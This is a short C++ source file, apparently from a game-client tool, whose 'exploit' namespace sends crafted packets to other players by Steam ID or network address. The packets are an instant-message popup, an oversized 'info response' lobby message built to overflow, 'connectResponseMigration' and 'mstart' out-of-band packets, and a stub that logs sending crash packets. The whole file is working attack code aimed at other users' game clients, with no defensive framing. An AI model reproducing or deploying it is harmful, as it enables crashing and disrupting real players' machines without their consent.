#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	namespace instant_message
	{
		void send_popup(const std::uint64_t target_steam_id)
		{
			const game::JoinSessionMessage message{};
			game::dwInstantSendMessage(0, &target_steam_id, 1, 'f', &message, 0);
		}

		void send_info_response_overflow(const std::uint64_t target_steam_id)
		{
			char buf[0x20000] = {0};
			game::LobbyMsg lobby_msg{};

			game::LobbyMsgRW_PrepWriteMsg(&lobby_msg, buf, sizeof buf, game::MESSAGE_TYPE_INFO_RESPONSE, 0);

			game::dwInstantSendMessage(0, &target_steam_id, 1, 'h', lobby_msg.msg.data, lobby_msg.msg.cursize);
		}
	}

	void send_connect_response_migration_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "mstart");
	}

	void send_crash(const game::netadr_t& to)
	{
		PRINT_LOG("Sending crash packets to %s", utils::string::adr_to_string(&to).data());

		
	}
}